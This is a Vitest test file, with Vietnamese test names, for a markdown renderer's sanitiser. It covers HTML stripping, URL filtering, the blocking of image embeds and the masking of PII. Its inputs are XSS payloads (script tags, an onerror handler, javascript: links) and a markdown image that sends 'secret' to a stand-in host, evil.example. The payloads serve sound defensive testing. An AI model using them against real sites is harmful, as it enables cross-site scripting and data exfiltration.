// SPDX-License-Identifier: Apache-2.0
// SPDX-FileCopyrightText: 2026 xT contributors
// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderMarkdown } from "../src/markdown";

describe("renderMarkdown", () => {
  it("render đậm, danh sách, bảng", () => {
    const h = renderMarkdown("**Minh** là CTO\n\n- a\n- b\n\n| x | y |\n|---|---|\n| 1 | 2 |");
    expect(h).toContain("<strong>Minh</strong>");
    expect(h).toContain("<li>a</li>");
    expect(h).toContain("<table>");
    expect(h).not.toContain("**");
  });
  it("loại script, onerror, iframe, style, form", () => {
    const h = renderMarkdown('<script>alert(1)</script><img src=x onerror=alert(1)><iframe src="//e.com"></iframe><style>*{}</style><form action=//e.com><input></form>ok');
    expect(h).not.toMatch(/<script|<img|<iframe|<style|<form|<input|onerror/i);
    expect(h).toContain("ok");
  });
  it("chặn javascript: và data: URL, giữ https và gắn rel/target", () => {
    expect(renderMarkdown("[x](javascript:alert(1))")).not.toMatch(/javascript:/i);
    expect(renderMarkdown("[x](data:text/html;base64,AAAA)")).not.toMatch(/data:/i);
    const h = renderMarkdown("[ok](https://xt.freepro.online/desk/confirm/1)");
    expect(h).toContain('href="https://xt.freepro.online/desk/confirm/1"');
    expect(h).toContain('rel="noopener noreferrer nofollow"');
    expect(h).toContain('target="_blank"');
  });
  it("không cho ảnh markdown (chặn rò rỉ qua URL)", () => {
    expect(renderMarkdown("![a](https://evil.example/p.png?d=secret)")).not.toContain("<img");
  });
  it("token PII hiện thành nhãn đã che", () => {
    const h = renderMarkdown("Lương: [PII:ab12_Cd]");
    expect(h).toContain('class="pii"');
    expect(h).toContain("[đã che]");
    expect(h).not.toContain("[PII:");
  });
});
